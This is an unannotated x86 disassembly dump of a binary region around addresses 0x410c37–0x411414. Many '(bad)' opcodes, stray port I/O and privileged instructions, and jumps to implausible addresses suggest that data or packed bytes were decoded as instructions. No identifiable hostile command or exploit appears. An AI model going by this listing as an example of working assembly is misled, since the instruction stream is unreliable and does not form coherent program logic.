  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
